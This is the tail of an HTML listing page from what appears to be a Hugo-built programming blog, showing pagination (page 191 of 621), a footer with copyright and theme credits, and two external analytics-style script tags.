		<a class="list__footer-readmore btn" href="/posts/b1a5529e52beff3a3baf40dfeed7fe02/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/190/">«</a>
	<span class="pagination__item pagination__item--current">191/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/192/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>